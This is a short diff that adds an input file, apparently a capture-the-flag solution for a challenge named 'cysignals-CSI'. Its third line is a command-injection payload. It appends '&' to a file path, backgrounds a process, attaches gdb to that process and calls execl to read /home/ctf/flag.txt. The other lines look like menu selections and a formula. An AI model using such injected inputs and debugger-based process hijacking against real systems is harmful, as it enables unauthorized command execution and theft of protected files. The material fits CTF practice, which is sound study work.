@@ -1,0 +1,6 @@
+2
+/opt/ctf/cysignals-CSI
+/home/ctf/tes & p=$!; sleep 0.5; /usr/bin/gdb -q -nx -p $p -batch -ex 'b pause' -ex 'signal 0' -ex 'call (int)execl("/bin/cat","cat","/home/ctf/flag.txt",(char*)0)' 2>&1
+1
+11
+0*x+0*y+3
